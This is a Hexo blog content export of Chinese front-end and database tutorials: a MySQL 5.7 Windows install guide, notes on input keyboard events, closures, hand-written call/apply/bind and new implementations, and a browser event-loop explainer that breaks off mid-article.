{"meta":{"title":"jiuylq","subtitle":null,"description":"jiuylq的博客","author":"jiuy","url":"https://jiuylq.github.io","root":"/"},"pages":[{"title":"about","date":"2019-03-07T16:16:53.000Z","updated":"2019-03-13T14:59:49.328Z","comments":false,"path":"about/index.html","permalink":"https://jiuylq.github.io/about/index.html","excerpt":"","text":""},{"title":"Tagcloud","date":"2017-03-07T15:24:53.000Z","updated":"2019-03-07T16:18:26.767Z","comments":false,"path":"tags/index.html","permalink":"https://jiuylq.github.io/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-03-07T16:14:32.000Z","updated":"2019-03-13T14:59:37.348Z","comments":false,"path":"categories/index.html","permalink":"https://jiuylq.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"mysql-install","slug":"mysql-install","date":"2019-05-16T07:25:23.000Z","updated":"2019-05-16T07:25:45.257Z","comments":true,"path":"2019/05/16/mysql-install/","link":"","permalink":"https://jiuylq.github.io/2019/05/16/mysql-install/","excerpt":"Mysql 安装","text":"Mysql 安装 Mysql 安装作为一名开发者日常生活中需要和数据库打交道，所以本文总结了一次mysql 5.7的安装过程中所遇到的一些问题，及安装过程（环境window 10，mysql5.7.zip） 一、准备工作从MySQL官网上下载mysql5.7.zip文件并解压到待安装目录 注意：由于mysql5.7版本不会自带默认配置文件my.ini,所以需要的话可以从mysql5.6中的my-default.ini复制到安装目录下的my.ini文件中,详情请看官网说明 本人安装时使用的配置文件1234567891011121314151617181920212223242526272829303132333435363738394041424344# For advice on how to change settings please see# http://dev.mysql.com/doc/refman/5.6/en/server-configuration-defaults.html# *** DO NOT EDIT THIS FILE. It's a template which will be copied to the# *** default location during install, and will be replaced if you# *** upgrade to a newer version of MySQL.[mysql]# 设置mysql客户端默认字符集# default-character-set=utf8[mysqld]# Remove leading # and set to the amount of RAM for the most important data# cache in MySQL. Start at 70% of total RAM for dedicated server, else 10%.# innodb_buffer_pool_size = 128M# Remove leading # to turn on a very important data integrity option: logging# changes to the binary log between backups.# log_bin# These are commonly set, remove the # and set as required.# basedir = .....# datadir = .....# port = 3306# server_id = .....# Remove leading # to set options mainly useful for reporting servers.# The server defaults are faster for transactions and fast SELECTs.# Adjust sizes as needed, experiment to find the optimal values.# join_buffer_size = 128M# sort_buffer_size = 2M# read_rnd_buffer_size = 2M sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES # 允许最大连接数# max_connections=20# 服务端使用的字符集默认为8比特编码的latin1字符集# character-set-server=utf8# 创建新表时将使用的默认存储引擎# default-storage-engine=INNODB 由于mysql5.7版本默认没有data目录文件，所以需要进行初始化（官网说明）进入到mysql5.7的解压目录中（我的是e:\\Server\\Mysql）以管理员的方式在当前目录打开终端，进行如下操作：12345cd bin # 进入到bin目录# 然后初始化data目录 （一下二选一）mysqld --initialize # 默认设置随机密码 （密码在当你登录mysql时候的错误日志里面）或输入 mysqld --initialize --console 秘密会直接打印出来mysqld --initialize-insecure # 默认没有密码 二、安装 完成第一步的配置后我们可以正式进入MySQL的安装了继续在终端中输入： 1234567#紧接上一步继续在解压目录中的bin中执行后续操作# installmysqld -install# 安装完成后启动mysqlnet start mysql 至此，你已经完成mysql5.7的基本安装，下面还需要给mysql设置的密码 1234567891011121314# 在命令行中输入下面指令进入到mysql中mysql -u root -p # 默认会提示你输入密码，不用管直接enter进入到mysql命令行中# 接着修改root的密码SET PASSWORD FOR 'root'@'localhost' = PASSWORD('new_password');# 修改完成后可以执行一下测试# 退出mysql命令行（以下三选一即可）exitquit\\q#重新在输入mysql -u root -p 输入刚刚设置的密码即可 看到这里是不是感觉MySQL的安装也不是特别的折腾啊（这里只是简单的配置安装，哈哈，够用就好） 三、MySQL的一些基本操作 前面我讲到了MySQL的安装的基本草做，接着我们得扩充一下对MySQL的基本操作是吧： 在命令行中进入到bin中：12345# 停止MySQL服务net stop mysql# 卸载服务mysqld --remove mysql 至此mysql5.7的安装体验正式完成，欢迎大家一起学习进步，如本文中有什么不足之处请联系我，谢谢！","categories":[],"tags":[]},{"title":"input-event","slug":"input-event","date":"2019-05-16T07:19:43.000Z","updated":"2019-05-16T07:21:48.816Z","comments":true,"path":"2019/05/16/input-event/","link":"","permalink":"https://jiuylq.github.io/2019/05/16/input-event/","excerpt":"input输入框事件详解","text":"input输入框事件详解 input输入框功能1、事件 1、keydown: 当用户按下任意键时触发，而且按住不放的话，会重复触发此事件。 2、keypress: 当用户按下字符键时触发，而且按住不放的话，会重复触发此事件。按下Esc键也会触发这个事件，Safari3.1之前的版本按下非字符键时也触发。 3、keyup: 当用户释放键时触发。 4、textInput：事件只会在用户按下能够输入实际字符的键时才会触发(textInput属性对火狐浏览器无兼容,目前只有safari、chrome支持) 5、onchange：事件在内容改变（两次内容有可能还是相等的）且失去焦点时触发。 6、onpropertychange 事件却是实时触发，即每增加或删除一个字符就会触发，通过 js 改变也会触发该事件，但是该事件 IE 专有。 7、oninput 事件是 IE 之外的大多数浏览器支持的事件，在 value 改变时触发，实时的，即每增加或删除一个字符就会触发，然而通过 js 改变 value 时，却不会触发。 注： (1) onpropertychange 事件是任何属性改变都会触发的，而 oninput 却只在 value 改变时触发，oninput 要通过 addEventListener() 来注册，onpropertychange 注册方式跟一般事件一样。（此处都是指在js中动态绑定事件，以实现内容与行为分离）（2）oninput 事件：a). 当脚本中改变 value 时，不会触发；b).从浏览器的自动下拉提示中选取时，不会触发。（3）onpropertychange 事件：当 input 设置为 disable=tru e后，onpropertychange 不会触发。 注意：英文输入法：按下键盘时会触发键盘事件，次序为keydown -&gt; keypress -&gt;keyup中文输入法：firfox：输入触发keydown，回车确认输入触发keyup(最新不会触发keydown)chrome：输入触发keydown、keyup，回车确认输入只触发keydownIE：输入触发keydown、keyup，回车确认输入触发keydown，keyupSafari：输入触发keydown、keyup，回车确认输入触发keydown，keyupopera：输入触发keydown、keyup，回车确认输入触发keydown，keyup keypress事件不能对系统功能键(例如：后退、删除等，其中对中文输入法不能有效响应)进行正常的响应，keydown和keyup均可以对系统功能键进行有效的拦截，但事件截获的位置不同。 键盘中的键分为字符(可打印)键和功能键(不可打印)，系统功能键包括如下： Esc、Tab、Caps Lock、Shift、Ctrl、Alt、Enter、Backspace、Print Screen、Scroll Lock、Pause Break、Insert、Delete、Home、End、Page Up、Page Down， F1 through F12，Num Lock、The Arrow Keys。 keypress响应系统功能键总结： Firefox：支持 Esc、Enter、Backspace、Pause Break、Insert、Delete、Home、End、Page Up、Page Down、F1 through F12、The Arrow Keys Chrome：支持Enter Oprea：支持Enter Safari：支持Enter IE：支持Esc、Enter ps:firefox：上下左右键会触发kepress.chrome： 上下左右键不会触发kepress.oprea：上下左右键不会触发kepress.safari：上下左右键不会触发kepress.IE：上下左右键不会触发kepress. ================================================================================ keyCode(键码), which, charCode(字符编码)keydown: 获得keyCode， charCode=0keypress: 字符（英文区分大小写+数字 / * , . …等非功能键），keyCode=0 ，获取charCode值， 反之获取keyCode， charCode=0keyup: 获得keyCode， charCode=0jquery 中 event.which = original.charCode != null ? original.charCode : original.keyCode;总结：回车、上下左右、等功能键keydown、keypress、keyup都获取keyCode，并且值相等。 开启大写情况，keydown、keypress(字母，主键盘数字、回车)、keyup，which值相等，小写kepress获取的which不同于keypress、keyup。keypress事件的keyCode对字母的大小写敏感，而keydown、keyup事件不敏感keypress事件的which值无法区分主键盘上的数字键和附键盘数字键的，而keydown、keyup的which值对主附键盘的数字键敏感。【IE(ie9以下)只有一个属性KeyCode属性，当为keydown和keyup 事件是，keycode属性表示你具体按下的键(也称为virtual keycode)，当捕捉的是keypress事件时keyCode属性指的是你键入的字符(character code)标准浏览器中情况有些不同，event对象包含一个keyCode属性和一个charCode属性，keydown和keyup事件的时候，keyCode表示的就是你具体按的键，charCode为0；当捕捉的是keypress事件时，keyCode为0，charCode指的是你按下的字符，鉴于IE和FF中的区别，如果你比较懒的话，建议只使用keydow和keyup事件】 /本文所涉及浏览器(除ie)都为最新版本/ https://www.cnblogs.com/silence516/archive/2013/01/25/2876611.html http://www.runoob.com/jsref/event-oninput.html https://www.cnblogs.com/leolai/archive/2012/08/01/2618386.html","categories":[],"tags":[]},{"title":"closure","slug":"closure","date":"2019-05-16T07:17:49.000Z","updated":"2019-05-16T07:21:30.298Z","comments":true,"path":"2019/05/16/closure/","link":"","permalink":"https://jiuylq.github.io/2019/05/16/closure/","excerpt":"Closure 闭包","text":"Closure 闭包 Closure 闭包什么是闭包（Closure）简单讲，闭包就是指有权访问另一个函数作用域中的变量的函数。 MDN 上面这么说：闭包是一种特殊的对象。它由两部分构成：函数，以及创建该函数的环境。环境由闭包创建时在作用域中的任何局部变量组成。 产生一个闭包创建闭包最常见方式，就是在一个函数内部创建另一个函数。下面例子中的 closure 就是一个闭包： 12345678function func()&#123; var a = 1,b = 2; function closure()&#123; return a+b; &#125; return closure;&#125; 闭包的作用域链包含着它自己的作用域，以及包含它的函数的作用域和全局作用域。 闭包的注意事项 通常，函数的作用域及其所有变量都会在函数执行结束后被销毁。但是，在创建了一个闭包以后，这个函数的作用域就会一直保存到闭包不存在为止。123456789101112131415function makeAdder(x) &#123; return function(y) &#123; return x + y; &#125;;&#125;var add5 = makeAdder(5);var add10 = makeAdder(10);console.log(add5(2)); // 7console.log(add10(2)); // 12// 释放对闭包的引用add5 = null;add10 = null; add5 和 add10 都是闭包。它们共享相同的函数定义，但是保存了不同的环境。在 add5 的环境中，x 为 5。而在 add10 中，x 则为 10。最后通过 null 释放了 add5 和 add10 对闭包的引用。 在javascript中，如果一个对象不再被引用，那么这个对象就会被垃圾回收机制回收；如果两个对象互相引用，而不再被第3者所引用，那么这两个互相引用的对象也会被回收。 闭包只能取得包含函数中任何变量的最后一个值，这是因为闭包所保存的是整个变量对象，而不是某个特殊的变量。 123456789101112function test()&#123; var arr = []; for(var i = 0;i &lt; 10;i++)&#123; arr[i] = function()&#123; return i; &#125;; &#125; for(var a = 0;a &lt; 10;a++)&#123; console.log(arr[a]()); &#125;&#125;test(); // 连续打印 10 个 10 对于上面的情况，如果我们改变代码如下： 123456789101112function test()&#123; var arr = []; for(let i = 0;i &lt; 10;i++)&#123; // 仅在这里作出了改动 arr[i] = function()&#123; return i; &#125;; &#125; for(var a = 0;a &lt; 10;a++)&#123; console.log(arr[a]()); &#125;&#125;test(); // 打印 0 到 9 对于上面两种代码的解释，请看segmentfault： 闭包中的 this 对象 12345678910111213var name = \"The Window\";var obj = &#123; name: \"My Object\", getName: function()&#123; return function()&#123; return this.name; &#125;; &#125;&#125;;console.log(obj.getName()()); // The Window obj.getName()()实际上是在全局作用域中调用了匿名函数，this指向了window。这里要理解函数名与函数功能（或者称函数值）是分割开的，不要认为函数在哪里，其内部的this就指向哪里。匿名函数的执行环境具有全局性，因此其 this 对象通常指向 window。 1234567891011121314var name = \"The Window\";var obj = &#123; name: \"My Object\", getName: function()&#123; var that = this; return function()&#123; return that.name; &#125;; &#125;&#125;;console.log(obj.getName()()); // My Object 闭包的应用 应用闭包的主要场合是：设计私有的方法和变量。 任何在函数中定义的变量，都可以认为是私有变量，因为不能在函数外部访问这些变量。私有变量包括函数的参数、局部变量和函数内定义的其他函数。 把有权访问私有变量的公有方法称为特权方法（privileged method）。 12345678910111213function Animal()&#123; // 私有变量 var series = \"哺乳动物\"; function run()&#123; console.log(\"Run!!!\"); &#125; // 特权方法 this.getSeries = function()&#123; return series; &#125;;&#125; 模块模式（The Module Pattern）：为单例创建私有变量和方法。单例（singleton）：指的是只有一个实例的对象。JavaScript 一般以对象字面量的方式来创建一个单例对象。 123456789var singleton = &#123; name: \"percy\", speak:function()&#123; console.log(\"speaking!!!\"); &#125;, getName: function()&#123; return this.name; &#125;&#125;; 上面是普通模式创建的单例，下面使用模块模式创建单例： 12345678910111213141516var singleton = (function()&#123; // 私有变量 var age = 22; var speak = function()&#123; console.log(\"speaking!!!\"); &#125;; // 特权（或公有）属性和方法 return &#123; name: \"percy\", getAge: function()&#123; return age; &#125; &#125;;&#125;)(); 匿名函数最大的用途是创建闭包，并且还可以构建命名空间，以减少全局变量的使用。从而使用闭包模块化代码，减少全局变量的污染。 123456789101112var objEvent = objEvent || &#123;&#125;;(function()&#123; var addEvent = function()&#123; // some code &#125;; function removeEvent()&#123; // some code &#125; objEvent.addEvent = addEvent; objEvent.removeEvent = removeEvent;&#125;)(); 在这段代码中函数 addEvent 和 removeEvent 都是局部变量，但我们可以通过全局变量 objEvent 使用它，这就大大减少了全局变量的使用，增强了网页的安全性。 一个闭包计数器 123456var countNumber = (function()&#123; var num = 0; return function()&#123; return ++num; &#125;;&#125;)(); 闭包的缺陷 闭包的缺点就是常驻内存会增大内存使用量，并且使用不当很容易造成内存泄露。 如果不是因为某些特殊任务而需要闭包，在没有必要的情况下，在其它函数中创建函数是不明智的，因为闭包对脚本性能具有负面影响，包括处理速度和内存消耗。 最后再来一些有关闭包的面试题 下面代码中，标记 ？ 的地方输出分别是什么？ 12345678910111213141516171819function fun(n,o)&#123; console.log(o); return &#123; fun: function(m)&#123; return fun(m,n); &#125; &#125;;&#125;var a = fun(0); // ?a.fun(1); // ? a.fun(2); // ?a.fun(3); // ?var b = fun(0).fun(1).fun(2).fun(3); // ?var c = fun(0).fun(1); // ?c.fun(2); // ?c.fun(3); // ? 12345678undefined000undefined, 0, 1, 2undefined, 011 参考 《JavaScript 高级程序设计（第三版）》 深入浅出Javascript闭包 【JavaScript】【函数】闭包闭包！ 学习Javascript闭包（Closure）","categories":[],"tags":[]},{"title":"call-apply-bind","slug":"call-apply-bind","date":"2019-05-16T07:16:18.000Z","updated":"2019-05-16T07:21:24.462Z","comments":true,"path":"2019/05/16/call-apply-bind/","link":"","permalink":"https://jiuylq.github.io/2019/05/16/call-apply-bind/","excerpt":"call apply bind","text":"call apply bind call apply bindcall模拟实现call、apply、bindcall12345678910111213Function.prototype.call = function (context) &#123; /** 如果第一个参数传入的是 null 或者是 undefined, 那么指向this指向 window/global */ /** 如果第一个参数传入的不是null或者是undefined, 那么必须是一个对象 */ if (!context) &#123; //context为null或者是undefined context = typeof window === 'undefined' ? global : window; &#125; context.fn = this; //this指向的是当前的函数(Function的实例) let rest = [...arguments].slice(1);//获取除了this指向对象以外的参数, 空数组slice后返回的仍然是空数组 let result = context.fn(...rest); //隐式绑定,当前函数的this指向了context. delete context.fn; return result;&#125; apply12345678910111213141516Function.prototype.apply = function (context, rest) &#123; if (!context) &#123; //context为null或者是undefined时,设置默认值 context = typeof window === 'undefined' ? global : window; &#125; context.fn = this; let result; if(rest === undefined || rest === null) &#123; //undefined 或者 是 null 不是 Iterator 对象，不能被 ... result = context.fn(rest); &#125;else if(typeof rest === 'object') &#123; result = context.fn(...rest); &#125; delete context.fn; return result;&#125; bind1234567891011121314151617Function.prototype.bind = function(context) &#123; if(typeof this !== \"function\")&#123; throw new TypeError(\"not a function\"); &#125; let self = this; let args = [...arguments].slice(1); function Fn() &#123;&#125;; Fn.prototype = this.prototype; let bound = function() &#123; let res = [...args, ...arguments]; //bind传递的参数和函数调用时传递的参数拼接 context = this instanceof Fn ? this : context || this; return self.apply(context, res); &#125; //原型链 bound.prototype = new Fn(); return bound;&#125; 参考： 【面试篇】寒冬求职季之你必须要懂的原生JS(上) 【中高级前端面试】JavaScript手写代码无敌秘籍 JavaScript深入之call和apply的模拟实现 JavaScript深入之bind的模拟实现 面试官问：能否模拟实现JS的call和apply方法 不能使用call,apply,bind，如何用js实现call或者apply的功能？","categories":[],"tags":[]},{"title":"newOperator","slug":"newOperator","date":"2019-05-16T07:13:15.000Z","updated":"2019-05-16T07:22:17.389Z","comments":true,"path":"2019/05/16/newOperator/","link":"","permalink":"https://jiuylq.github.io/2019/05/16/newOperator/","excerpt":"new 操作符","text":"new 操作符 new 操作符new操作符做了这些事： 它创建了一个全新的对象。 它会被执行[[Prototype]]（也就是proto）链接。 它使this指向新创建的对象。。 通过new创建的每个对象将最终被[[Prototype]]链接到这个函数的prototype对象上。 如果函数没有返回对象类型Object(包含Functoin, Array, Date, RegExg, Error)，那么new表达式中的函数调用将返回该对象引用。 手动实现： 一、 1234567891011121314function New(func) &#123; var res = &#123;&#125;; if (func.prototype !== null) &#123; res.__proto__ = func.prototype; &#125; var ret = func.apply(res, Array.prototype.slice.call(arguments, 1)); if ((typeof ret === \"object\" || typeof ret === \"function\") &amp;&amp; ret !== null) &#123; return ret; &#125; return res;&#125;var obj = New(A, 1, 2);// equals tovar obj = new A(1, 2); 二、 123456789101112131415function newOperator(ctor)&#123; if(typeof ctor !== 'function')&#123; throw 'newOperator function the first param must be a function'; &#125; newOperator.target = ctor; var newObj = Object.create(ctor.prototype); var argsArr = [].slice.call(arguments, 1); var ctorReturnResult = ctor.apply(newObj, argsArr); var isObject = typeof ctorReturnResult === 'object' &amp;&amp; ctorReturnResult !== null; var isFunction = typeof ctorReturnResult === 'function'; if(isObject || isFunction)&#123; return ctorReturnResult; &#125; return newObj;&#125; 参考： 【中高级前端面试】JavaScript手写代码无敌秘籍 【面试官问】能否模拟实现JS的new操作符 【面试篇】寒冬求职季之你必须要懂的原生JS(上) JavaScript深入之new的模拟实现","categories":[],"tags":[]},{"title":"Event Loop","slug":"Event Loop","date":"2019-04-27T16:20:38.000Z","updated":"2019-04-27T16:27:41.589Z","comments":true,"path":"2019/04/28/Event Loop/","link":"","permalink":"https://jiuylq.github.io/2019/04/28/Event Loop/","excerpt":"Event Loop即事件循环，是指浏览器或Node的一种解决javaScript单线程运行时不会阻塞的一种机制，也就是我们经常使用异步的原理。","text":"Event Loop即事件循环，是指浏览器或Node的一种解决javaScript单线程运行时不会阻塞的一种机制，也就是我们经常使用异步的原理。 Event Loop镇楼题自我评测下： 1234567891011121314151617181920async function async1() &#123; console.log('async1 start'); await async2(); console.log('async1 end');&#125;async function async2() &#123; console.log('async2');&#125;console.log('script start');setTimeout(function() &#123; console.log('setTimeout');&#125;, 0);async1();new Promise(function(resolve) &#123; console.log('promise1'); resolve();&#125;).then(function() &#123; console.log('promise2');&#125;);console.log('script end'); 前言Event Loop即事件循环，是指浏览器或Node的一种解决javaScript单线程运行时不会阻塞的一种机制，也就是我们经常使用异步的原理。 线程与进程1.概念 我们经常说JS 是单线程执行的，指的是一个进程里只有一个主线程，那到底什么是线程？什么是进程？ 官方语术： 进程是 CPU资源分配的最小单位（是能拥有资源和独立运行的最小单位） 线程是 CPU调度的最小单位（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程） eg: 进程好比图中的工厂，有单独的专属自己的工厂资源。 线程好比图中的工人，多个工人在一个工厂中协作工作，工厂与工人是 1:n的关系。也就是说一个进程由一个或多个线程组成，线程是一个进程中代码的不同执行路线； 工厂的空间是工人们共享的，这象征一个进程的内存空间是共享的，每个线程都可用这些共享内存。 多个工厂之间独立存在。 tips 不同进程之间也可以通信，不过代价较大 现在，一般通用的叫法：单线程与多线程，都是指在一个进程内的单和多。（所以核心还是得属于一个进程才行） 2.多进程与多线程 多进程：在同一个时间里，同一个计算机系统中如果允许两个或两个以上的进程处于运行状态。多进程带来的好处是明显的，比如你可以听歌的同时，打开编辑器敲代码，编辑器和听歌软件的进程之间丝毫不会相互干扰。 多线程：程序中包含多个执行流，即在一个程序中可以同时运行多个不同的线程来执行不同的任务，也就是说允许单个程序创建多个并行执行的线程来完成各自的任务。 以Chrome浏览器中为例，当你打开一个 Tab 页时，其实就是创建了一个进程，一个进程中可以有多个线程（下文会详细介绍），比如渲染线程、JS 引擎线程、HTTP 请求线程等等。当你发起一个请求时，其实就是创建了一个线程，当请求结束后，该线程可能就会被销毁。 浏览器是多进程的了解了线程和进程的区别后，接下来我们对浏览器进行一定程度上的认识 浏览器是多进程的 浏览器之所以能够运行，是因为系统给它的进程分配了资源（cpu、内存） 简单点理解，每打开一个Tab页，就相当于创建了一个独立的浏览器进程。 关于以上几点的验证，请再看下面这张图： 图中打开了Chrome浏览器的多个标签页，然后可以在Chrome的任务管理器中看到有多个进程（分别是每一个Tab页面有一个独立的进程，以及一个主进程）。 感兴趣的可以自行尝试下，如果再多打开一个Tab页，进程正常会+1以上 注意：在这里浏览器应该也有自己的优化机制，有时候打开多个tab页后，可以在Chrome任务管理器中看到，有些进程被合并了 （所以每一个Tab标签对应一个进程并不一定是绝对的） 浏览器都包含哪些进程？知道了浏览器是多进程后，再来看看它到底包含哪些进程：（为了简化理解，仅列举主要进程） 1.Browser进程：浏览器的主进程（负责协调、主控），只有一个。作用有 负责浏览器界面显示，与用户交互。如前进，后退等 负责各个页面的管理，创建和销毁其他进程 将Renderer进程得到的内存中的Bitmap，绘制到用户界面上 网络资源的管理，下载等 2.第三方插件进程：每种类型的插件对应一个进程，仅当使用该插件时才创建 3.GPU进程：最多一个，用于3D绘制等 4.浏览器渲染进程（浏览器内核）（Renderer进程，内部是多线程的）：默认每个Tab页面一个进程，互不影响。主要作用为 页面渲染，脚本执行，事件处理等 强化记忆：在浏览器中打开一个网页相当于新起了一个进程（进程内有自己的多线程） 当然，浏览器有时会将多个进程合并（譬如打开多个空白标签页后，会发现多个空白标签页被合并成了一个进程），如图 浏览器多进程的优势相比于单进程浏览器，多进程有如下优点： 避免单个page crash影响整个浏览器 避免第三方插件crash影响整个浏览器 多进程充分利用多核优势 方便使用沙盒模型隔离插件等进程，提高浏览器稳定性 简单点理解：如果浏览器是单进程，那么某个Tab页崩溃了，就影响了整个浏览器，体验有多差；同理如果是单进程，插件崩溃了也会影响整个浏览器；而且多进程还有其它的诸多优势。。。 当然，内存等资源消耗也会更大，有点空间换时间的意思。 浏览器内核（渲染进程）我们可以看到，上面提到了这么多的进程，那么，对于普通的前端操作来说，最重要的是什么呢？答案是渲染进程 可以这样理解，页面的渲染，JS的执行，事件的循环，都在这个进程内进行。接下来重点分析这个进程 请牢记，浏览器的渲染进程是多线程的（这点如果不理解，请回头看进程和线程的区分） 接下来看看它都包含了哪些线程（列举一些主要常驻线程）： 1.GUI渲染线程 负责渲染浏览器界面，解析HTML，CSS，构建DOM树和RenderObject树，布局和绘制等。 当界面需要重绘（Repaint）或由于某种操作引发回流(reflow)时，该线程就会执行 注意，GUI渲染线程与JS引擎线程是互斥的，当JS引擎执行时GUI线程会被挂起（相当于被冻结了），GUI更新会被保存在一个队列中等到JS引擎空闲时立即被执行。 2.JS引擎线程 也称为JS内核，负责处理Javascript脚本程序。（例如V8引擎） JS引擎线程负责解析Javascript脚本，运行代码。 JS引擎一直等待着任务队列中任务的到来，然后加以处理，一个Tab页（renderer进程）中无论什么时候都只有一个JS线程在运行JS程序 同样注意，GUI渲染线程与JS引擎线程是互斥的，所以如果JS执行的时间过长，这样就会造成页面的渲染不连贯，导致页面渲染加载阻塞。 3.事件触发线程 归属于浏览器而不是JS引擎，用来控制事件循环（可以理解，JS引擎自己都忙不过来，需要浏览器另开线程协助） 当JS引擎执行代码块如setTimeOut时（也可来自浏览器内核的其他线程,如鼠标点击、AJAX异步请求等），会将对应任务添加到事件线程中 当对应的事件符合触发条件被触发时，该线程会把事件添加到待处理队列的队尾，等待JS引擎的处理 注意，由于JS的单线程关系，所以这些待处理队列中的事件都得排队等待JS引擎处理（当JS引擎空闲时才会去执行） 4.定时触发器线程 传说中的setInterval与setTimeout所在线程 浏览器定时计数器并不是由JavaScript引擎计数的,（因为JavaScript引擎是单线程的, 如果处于阻塞线程状态就会影响记计时的准确） 因此通过单独线程来计时并触发定时（计时完毕后，添加到事件队列中，等待JS引擎空闲后执行） 注意，W3C在HTML标准中规定，规定要求setTimeout中低于4ms的时间间隔算为4ms。 5.异步http请求线程 在XMLHttpRequest在连接后是通过浏览器新开一个线程请求 将检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件，将这个回调再放入事件队列中。再由JavaScript引擎执行。 为什么 JavaScript 是单线程的？我们都知道Javascript是一门单线程的语言（即同一时间只能做一件事），因为 JavaScript 生来作为浏览器脚本语言，主要用来处理与用户的交互、网络以及操作 DOM。这就决定了它只能是单线程的，否则会带来很复杂的同步问题。 假设 JavaScript 有两个线程，一个线程在某个 DOM 节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？ 既然 Javascript 是单线程的，它就像是只有一个窗口的银行，客户不得不排队一个一个的等待办理。同理 JavaScript 的任务也要一个接一个的执行，如果某个任务（比如加载高清图片）是个耗时任务，那浏览器岂不得一直卡着？为了防止主线程的阻塞，JavaScript 有了 同步 和 异步 的概念。 Browser进程和浏览器内核（Renderer进程）的通信过程看到这里，首先，应该对浏览器内的进程和线程都有一定理解了，那么接下来，再谈谈浏览器的Browser进程（控制进程）是如何和内核通信的， 这点也理解后，就可以将这部分的知识串联起来，从头到尾有一个完整的概念。 如果自己打开任务管理器，然后打开一个浏览器，就可以看到：任务管理器中出现了两个进程（一个是主控进程，一个则是打开Tab页的渲染进程）， 然后在这前提下，看下整个的过程：(简化了很多) Browser进程收到用户请求，首先需要获取页面内容（譬如通过网络下载资源），随后将该任务通过RendererHost接口传递给Render进程 Renderer进程的Renderer接口收到消息，简单解释后，交给渲染线程，然后开始渲染 渲染线程接收请求，加载网页并渲染网页，这其中可能需要Browser进程获取资源和需要GPU进程来帮助渲染 当然可能会有JS线程操作DOM（这样可能会造成回流并重绘） 最后Render进程将结果传递给Browser进程 Browser进程接收到结果并将结果绘制出来 看完这一整套流程，应该对浏览器的运作有了一定理解了，这样有了知识架构的基础后，后续就方便往上填充内容。 这块再往深处讲的话就涉及到浏览器内核源码解析了，不属于本文范围。 如果这一块要深挖，建议去读一些浏览器内核源码解析文章，或者可以先看看参考下来源中的第一篇文章，写的不错 梳理浏览器内核中线程之间的关系通过以上的学习，已经对浏览器的运行有了一个整体的概念，接下来，先简单梳理一些概念 GUI渲染线程与JS引擎线程互斥由于JavaScript是可操纵DOM的，如果在修改这些元素属性同时渲染界面（即JS线程和UI线程同时运行），那么渲染线程前后获得的元素数据就可能不一致了。 因此为了防止渲染出现不可预期的结果，浏览器设置GUI渲染线程与JS引擎为互斥的关系，当JS引擎执行时GUI线程会被挂起， GUI更新则会被保存在一个队列中等到JS引擎线程空闲时立即被执行。 JS阻塞页面加载从上述的互斥关系，可以推导出，JS如果执行时间过长就会阻塞页面。 譬如，假设JS引擎正在进行巨量的计算，此时就算GUI有更新，也会被保存到队列中，等待JS引擎空闲后执行。 然后，由于巨量计算，所以JS引擎很可能很久很久后才能空闲，自然会感觉到巨卡无比。 所以，要尽量避免JS执行时间过长，这样就会造成页面的渲染不连贯，导致页面渲染加载阻塞的感觉。 WebWorker，JS的多线程？前文中有提到JS引擎是单线程的，而且JS执行时间过长会阻塞页面，那么JS就真的对cpu密集型计算无能为力么？ 所以，后来HTML5中支持了Web Worker。 MDN的官方解释是：1234567Web Worker为Web内容在后台线程中运行脚本提供了一种简单的方法。线程可以执行任务而不干扰用户界面一个worker是使用一个构造函数创建的一个对象(e.g. Worker()) 运行一个命名的JavaScript文件 这个文件包含将在工作线程中运行的代码; workers 运行在另一个全局上下文中,不同于当前的window因此，使用 window快捷方式获取当前全局的范围 (而不是self) 在一个 Worker 内将返回错误 这样理解下： 创建Worker时，JS引擎向浏览器申请开一个子线程（子线程是浏览器开的，完全受主线程控制，而且不能操作DOM） JS引擎线程与worker线程间通过特定的方式通信（postMessage API，需要通过序列化对象来与线程交互特定的数据） 所以，如果有非常耗时的工作，请单独开一个Worker线程，这样里面不管如何翻天覆地都不会影响JS引擎主线程， 只待计算出结果后，将结果通信给主线程即可，perfect! 而且注意下，JS引擎是单线程的，这一点的本质仍然未改变，Worker可以理解是浏览器给JS引擎开的外挂，专门用来解决那些大量计算问题。 WebWorker与SharedWorker既然都到了这里，就再提一下SharedWorker（避免后续将这两个概念搞混） WebWorker只属于某个页面，不会和其他页面的Render进程（浏览器内核进程）共享 所以Chrome在Render进程中（每一个Tab页就是一个render进程）创建一个新的线程来运行Worker中的JavaScript程序。 SharedWorker是浏览器所有页面共享的，不能采用与Worker同样的方式实现，因为它不隶属于某个Render进程，可以为多个Render进程共享使用 所以Chrome浏览器为SharedWorker单独创建一个进程来运行JavaScript程序，在浏览器中每个相同的JavaScript只存在一个SharedWorker进程，不管它被创建多少次。 看到这里，应该就很容易明白了，本质上就是进程和线程的区别。SharedWorker由独立的进程管理，WebWorker只是属于render进程下的一个线程 简单梳理下浏览器渲染流程本来是直接计划开始谈JS运行机制的，但想了想，既然上述都一直在谈浏览器，直接跳到JS可能再突兀，因此，中间再补充下浏览器的渲染流程（简单版本） 为了简化理解，前期工作直接省略成：（要展开的或完全可以写另一篇超长文）12345- 浏览器输入url，浏览器主进程接管，开一个下载线程，然后进行 http请求（略去DNS查询，IP寻址等等操作），然后等待响应，获取内容，随后将内容通过RendererHost接口转交给Renderer进程- 浏览器渲染流程开始 浏览器器内核拿到内容后，渲染大概可以划分成以下几个步骤： 1.解析html建立dom树2.解析css构建render树（将CSS代码解析成树形的数据结构，然后结合DOM合并成render树）3.布局render树（Layout/reflow），负责各元素尺寸、位置的计算4.绘制render树（paint），绘制页面像素信息5.浏览器会将各层的信息发送给GPU，GPU会将各层合成（composite），显示在屏幕上。 所有详细步骤都已经略去，渲染完毕后就是load事件了，之后就是自己的JS逻辑处理了 既然略去了一些详细的步骤，那么就提一些可能需要注意的细节把。 load事件与DOMContentLoaded事件的先后上面提到，渲染完毕后会触发load事件，那么你能分清楚load事件与DOMContentLoaded事件的先后么 很简单，知道它们的定义就可以了： 当 DOMContentLoaded 事件触发时，仅当DOM加载完成，不包括样式表，图片。 (譬如如果有async加载的脚本就不一定完成) 当 onload 事件触发时，页面上所有的DOM，样式表，脚本，图片都已经加载完成了。 （渲染完毕了） 所以，顺序是：DOMContentLoaded -&gt; load css加载是否会阻塞dom树渲染？这里说的是头部引入css的情况 首先，我们都知道：css是由单独的下载线程异步下载的。 